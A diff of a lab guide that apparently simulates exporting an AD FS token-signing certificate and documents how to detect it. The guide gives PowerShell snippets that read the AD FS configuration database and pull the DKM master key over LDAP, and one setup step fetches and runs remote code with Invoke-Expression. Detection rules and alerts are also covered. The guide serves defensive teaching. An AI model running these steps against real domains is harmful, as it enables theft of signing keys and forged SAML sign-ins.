@@ -1,9 +1,12 @@
 # Local Export Active Directory Federation Services (AD FS) Token Signing Certificate
 
 Federation servers require token-signing certificates to prevent attackers from altering or counterfeiting security tokens to gain unauthorized access to Federated resources. 
-The AD FS certificates (token signing and decryption) are stored in the AD FS database configuration and they are encrypted using Distributed Key Manager (DKM) APIs. 
+The AD FS certificates (token signing and decryption) are stored in the AD FS database configuration and they are encrypted using Distributed Key Manager (DKM) APIs.
+
 Distributed Key Manager (DKM) is a client-side functionality that uses a set of secret keys to encrypt and decrypt information. Only members of a specific security group in Active Directory Domain Services (AD DS) can access those keys in order to decrypt the data that is encrypted by DKM.
+
 When the primary AD FS farm is configured, an AD container (AD FS DKM container) is created in the AD DS server and a DKM master key is stored as part of a contact AD object property in the DKM container. The AD FS DKM master key can then be used by the AD FS service to derive a symmetric key and decrypt AD FS certificates.
+
 If a threat actor retrieves the AD FS DKM master key and decrypts AD FS token signing certificate, the certificate can be used to sign SAML tokens and impersonate users in a federated environment.
 
 ## Main Steps
@@ -21,7 +24,8 @@ A threat actor could retrieve the AD FS configuration settings and the AD FS DKM
 Most of the steps from the following sections are code snippets extracted from a well-known open-source tool named [AADInternals](https://github.com/Gerenios/AADInternals) and developed by [Dr. Nestori Syynimaa](https://twitter.com/DrAzureAD).
 
 ## Get AD FS Configuration Settings
-The AD FS configuration settings can be stored in either a Microsoft SQL server database or the Windows Internal Database (WID) feature that is included with Windows server 2008, 2008 R2 and 2012. You can choose or the other one, but not both. For this lab environment, we use WID to store the AD FS configuration database.
+The AD FS configuration settings can be stored in either a Microsoft SQL server database or the Windows Internal Database (WID) feature that is included with Windows Server 2008, 2008 R2 and 2012. You can choose either one, but not both. For this lab environment, we use WID to store the AD FS configuration database.
+
 A threat actor would first get the AD FS configuration settings to obtain sensitive information such as the AD FS certificates and information about the AD FS DKM container in Active Directory (AD). One can get the AD FS configuration settings either locally or remotely.
 
 ### Simulate Local Connection
@@ -31,7 +35,8 @@ A threat actor would first get the AD FS configuration settings to obtain sensit
     * Services Running: Active Directory Federation Services (ADFSSRV)
 
 **Get Database Connection String via WMI Class**
-Locally, WID does not have its own management user interface (UI), but one could connect to it via a specific named pipe.  This information can be obtained directly from the “ConfigurationDatabaseConnectionString” property of the SecurityTokenService class from the WMI ADFS namespace.
+
+Locally, WID does not have its own management user interface (UI), but one could connect to it via a specific named pipe. This information can be obtained directly from the `ConfigurationDatabaseConnectionString` property of the `SecurityTokenService` class from the WMI ADFS namespace.
 
 ```PowerShell
 $ADFS = Get-WmiObject -Namespace root/ADFS -Class SecurityTokenService
@@ -41,6 +46,7 @@ $conn = $ADFS.ConfigurationDatabaseConnectionString
 ![](../../resources/images/simulate_detect/credential-access/localExportADFSTokenSigningCertificate/2021-05-19_02_get_database_string_wmi_class.png)
 
 **Connect to AD FS database and read configuration**
+
 We can then use the connection string to connect to the AD FS database and read its configuration.
 
 ```PowerShell
@@ -66,7 +72,7 @@ The connection to the AD FS database occurs via the following named pipe:
 
 `\\.\pipe\microsoft##wid\tsql\query`
 
-We could detect the local connection to the named pipe with Sysmon event ID 18 (Pipe Connected) with the following detection and filter out potential false positives.
+We could detect the local connection to the named pipe with `Sysmon Event ID 18 (Pipe Connected)` with the following detection and filter out potential false positives:
 
 [AD FS Local Named Pipe Connection Rule](https://github.com/Azure/Azure-Sentinel/blob/master/Detections/SecurityEvent/ADFSKeyExportSysmon.yaml)
 
@@ -87,7 +93,8 @@ $encPfxBytes=[System.Convert]::FromBase64String($encPfx)
 
 ## Get AD FS DKM Container Active Directory Path
 Even though we were able to get the AD FS token signing certificate, we still need to decrypt it. As mentioned at the beginning of this document, the AD FS certificates are encrypted using Distributed Key Manager (DKM) APIs and the DKM master key used to derive the symmetric key to decrypt them is stored in the AD DS server.
-The AD FS DKM key value is stored in the `ThumbnailPhoto attribute` of a contact AD object in the AD FS DKM container. Therefore, we first need to get the right path to the AD FS DKM container and specific DKM group. We can get this information from the AD FS configuration settings we obtained earlier.
+
+The AD FS DKM key value is stored in the `ThumbnailPhoto` attribute of a contact AD object in the AD FS DKM container. Therefore, we first need to get the right path to the AD FS DKM container and specific DKM group. We can get this information from the AD FS configuration settings we obtained earlier.
 
 ```PowerShell
 [xml]$xml=$settings
@@ -112,7 +119,8 @@ With the right path to the AD FS DKM container and DKM group in the AD DS server
     * Ports Open: 389
 
 **LDAP Query with ThumbnailPhoto Attribute in Filter**
-We can use LDAP and create a query filtering on specific objects with the ThumbnailPhoto attribute. We can then read the encryption key from the ThumbnailPhoto attribute.
+
+We can use LDAP and create a query filtering on specific objects with the `ThumbnailPhoto` attribute. We can then read the encryption key from the `ThumbnailPhoto` attribute.
 
 ```PowerShell
 $ADSearch = [System.DirectoryServices.DirectorySearcher]::new([System.DirectoryServices.DirectoryEntry]::new($base))
@@ -124,8 +132,9 @@ $key=[byte[]]$aduser.Properties["thumbnailphoto"][0]
 ```
 ![](../../resources/images/simulate_detect/credential-access/localExportADFSTokenSigningCertificate/2021-05-19_07_ldap_thumbnailphoto_filter.png)
 
-**LDAP Query Filtering on CryptoPolicy Object to then Access the Right Contact AD Object**
-One could filter on the CryptoPolicy contact object inside of the AD FS DKM container and get the value of its DisplayName attribute. This attribute refers to the “l” attribute of the right AD contact object that contains the DKM master key value. The DKM key is stored in its ThumbnailPhoto attribute.
+**LDAP Query Filtering on `CryptoPolicy` Object to then Access the Right Contact AD Object**
+
+One could filter on the `CryptoPolicy` contact object inside of the AD FS DKM container and get the value of its `DisplayName` attribute. This attribute refers to the `l` attribute of the right AD contact object that contains the DKM master key value. The DKM key is stored in its `ThumbnailPhoto` attribute.
 
 ```PowerShell
 $ADSearch = [System.DirectoryServices.DirectorySearcher]::new([System.DirectoryServices.DirectoryEntry]::new($base))
@@ -143,10 +152,11 @@ $key=[byte[]]$aduser.Properties["thumbnailphoto"][0]
 
 ## Detect LDAP Queries: Microsoft Defender for Identity
 
-### LDAP Query with “thumbnailPhoto” Property in Filter
-When a threat actor sets the property “thumbnailPhoto” as a filter in the LDAP search query, the MDI sensor in the domain controller triggers an alert of type “Active Directory attributes Reconnaissance using LDAP”.
-1.	Navigate to [Microsoft 365 Security Center](https://security.microsoft.com/)
-2.	Go to “More Resources” and click on “[Azure Advanced Threat Protection](https://simuland.atp.azure.com/)”.
+### LDAP Query with `ThumbnailPhoto` Property in Filter
+
+When a threat actor sets the property `ThumbnailPhoto` as a filter in the LDAP search query, the MDI sensor in the domain controller triggers an alert of type `Active Directory attributes Reconnaissance using LDAP`.
+1.	Navigate to [Microsoft 365 Security Center](https://security.microsoft.com/).
+2.	Go to `More Resources` and click on [Azure Advanced Threat Protection](https://simuland.atp.azure.com/).
 
 ![](../../resources/images/simulate_detect/credential-access/localExportADFSTokenSigningCertificate/2021-05-19_09_m365_mdi_alert.png)
 
@@ -155,20 +165,20 @@ When a threat actor sets the property “thumbnailPhoto” as a filter in the LD
 
 ## Detect LDAP Queries: Microsoft Cloud App Security
 
-### LDAP Query with “thumbnailPhoto” Property in Filter
+### LDAP Query with `ThumbnailPhoto` Property in Filter
 You can also see the same alert in the Microsoft Cloud Application Security (MCAS) portal. The MCAS portal is considered a new investigation experience for MDI.
-1.	Navigate to [Microsoft 365 Security Center](https://security.microsoft.com/)
-2.	Go to “More Resources” and click on “[Microsoft Cloud App Security](https://portal.cloudappsecurity.com/)”.
+1.	Navigate to [Microsoft 365 Security Center](https://security.microsoft.com/).
+2.	Go to `More Resources` and click on [Microsoft Cloud App Security](https://portal.cloudappsecurity.com/).
 
 ![](../../resources/images/simulate_detect/credential-access/localExportADFSTokenSigningCertificate/2021-05-19_11_m365_mcas_alert.png)
 
 ## Detect LDAP Queries: Microsoft Defender for Endpoint
 
-### LDAP Query with “thumbnailPhoto” Property in Filter
-Microsoft Defender for Endpoint sensors also trigger an alert named `ADFS private key extraction attempt` when a threat actor sets the property `thumbnailPhoto` as a filter in the LDAP search query.
-1.	Navigate to [Microsoft 365 Security Center](https://security.microsoft.com/)
-2.	Go to “More Resources” and click on “[Microsoft Defender Security Center](https://login.microsoftonline.com/)”
-3.	Go to “Incidents”
+### LDAP Query with `ThumbnailPhoto` Property in Filter
+Microsoft Defender for Endpoint sensors also trigger an alert named `ADFS private key extraction attempt` when a threat actor sets the property `ThumbnailPhoto` as a filter in the LDAP search query.
+1.	Navigate to [Microsoft 365 Security Center](https://security.microsoft.com/).
+2.	Go to `More Resources` and click on [Microsoft Defender Security Center](https://login.microsoftonline.com/).
+3.	Go to `Incidents`.
 
 ![](../../resources/images/simulate_detect/credential-access/localExportADFSTokenSigningCertificate/2021-05-19_12_m365_mde_alert.png)
 
@@ -176,8 +186,8 @@ Microsoft Defender for Endpoint sensors also trigger an alert named `ADFS privat
 
 ![](../../resources/images/simulate_detect/credential-access/localExportADFSTokenSigningCertificate/2021-05-19_14_m365_mde_alert.png)
 
-### LDAP Query with Indirect Access to “thumbnailPhoto” Property
-Microsoft Defender for Endpoint sensors also trigger an alert named `ADFS private key extraction attempt` when a threat actor still access the contact AD object holding the DKM key, but without specifying the “thumbnailPhoto” attribute as part of the filter in the LDAP search query.
+### LDAP Query with Indirect Access to `ThumbnailPhoto` Property
+Microsoft Defender for Endpoint sensors also trigger an alert named `ADFS private key extraction attempt` when a threat actor still access the contact AD object holding the DKM key, but without specifying the `ThumbnailPhoto` attribute as part of the filter in the LDAP search query.
 
 ![](../../resources/images/simulate_detect/credential-access/localExportADFSTokenSigningCertificate/2021-05-19_15_m365_mde_alert.png)
 
@@ -193,11 +203,10 @@ You might not get another alert in the management user interface (UI), but if yo
 
 We can also audit the access request to the AD FS DKM contact AD object that holds the DKM master key in the AD DS server. This audit rule can be enabled by adding an Access Control Entry (ACE) to the System Access Control List (SACL) of the AD object in the domain controller. [A SACL is a type of access control list to log attempts to access a secured object](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-control-lists).
 
-Create audit rule
-1.	Connect to the Domain Controller (DC01) via Azure Bastion services as an Administrator
-2.	Open PowerShell console as an Administrator
-3.	Import Active Directory Module
-Import-Module ActiveDirectory
+**Create Audit Rule**
+1.	Connect to the Domain Controller (DC01) via Azure Bastion services as an Administrator.
+2.	Open PowerShell console as an Administrator.
+3.	Import Active Directory Module: `Import-Module ActiveDirectory`.
 4.	Import the project [Set-AuditRule](https://github.com/OTRF/Set-AuditRule) in GitHub as a PowerShell module to automate the process.
 
 ```PowerShell
@@ -207,16 +216,16 @@ Invoke-Expression $($RemoteFunction.Content)
 ```
 
 5.	Get the distinguished name (DN) of the AD Contact object that contains the DKM master key.
-6.	Create an “Audit” rule to audit any ‘Generic Read’ requests to that AD object.
+6.	Create an `Audit` rule to audit any `Generic Read` requests to that AD object.
 
 ```PowerShell
-$ADObjectPath = ‘CN=<AD Contact Object>,CN=<DKM Group>,CN=ADFS,CN=Microsoft,CN=Program Data,DC=simulandlabs,DC=com’
+$ADObjectPath = 'CN=<AD Contact Object>,CN=<DKM Group>,CN=ADFS,CN=Microsoft,CN=Program Data,DC=simulandlabs,DC=com'
 
-Set-AuditRule -AdObjectPath “AD:\$ADObjectPath” -WellKnownSidType WorldSid -Rights GenericRead -InheritanceFlags None -AuditFlags Success
+Set-AuditRule -AdObjectPath "AD:\$ADObjectPath" -WellKnownSidType WorldSid -Rights GenericRead -InheritanceFlags None -AuditFlags Success
 ```
 ![](../../resources/images/simulate_detect/credential-access/localExportADFSTokenSigningCertificate/2021-05-19_17_create_sacl.png)
 
-Once the audit rule is enabled, run any of the previous LDAP search queries to obtain the AD FS DKM master key.  Let’s do it from the `ADFS01` server. You will see the following `Windows Security Event ID 4662` in the Domain Controller:
+Once the audit rule is enabled, run any of the previous LDAP search queries to obtain the AD FS DKM master key. Let's do it from the `ADFS01` server. You will see the following `Windows Security Event ID 4662` in the Domain Controller:
 
 ![](../../resources/images/simulate_detect/credential-access/localExportADFSTokenSigningCertificate/2021-05-19_18_dc_event_4662.png)
 
@@ -279,10 +288,11 @@ $ms.Dispose()
 
 ## Export AD FS Token Signing Certificate
 We can simply export the token signing certificate cipher text to a .pfx file.
+
 Once again, remember that a threat actor would decrypt and export the token signing certificate and sign SAML tokens in their own environment outside of the organization.
 
 ```PowerShell
-$CertificatePath = ‘C:\ProgramData\ADFSTokenSigningCertificate.pfx’
+$CertificatePath = 'C:\ProgramData\ADFSTokenSigningCertificate.pfx'
 $pfx | Set-Content $CertificatePath -Encoding Byte
 ```
 
